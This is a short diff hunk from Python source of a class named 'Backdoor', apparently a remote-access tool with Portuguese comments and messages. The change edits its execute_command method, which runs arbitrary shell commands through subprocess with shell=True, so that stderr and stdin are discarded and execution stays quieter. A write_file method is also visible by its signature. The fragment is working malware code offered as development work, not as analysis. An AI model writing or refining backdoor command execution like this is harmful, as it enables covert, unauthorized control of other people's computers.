@@ -29,7 +29,7 @@ class Backdoor:
 
     def execute_command(self, command):
         try:
-            return (subprocess.check_output(command, shell=True)).decode('utf-8',errors="ignore")  # O comando retorna um tipo byte, por isso é necessário decodificar para string
+            return (subprocess.check_output(command, shell=True, stderr= subprocess.DEVNULL, stdin=subprocess.DEVNULL)).decode('utf-8',errors="ignore")
         except Exception:
             return "[-] Erro na execucao do comando"
     def write_file(self,path,content):
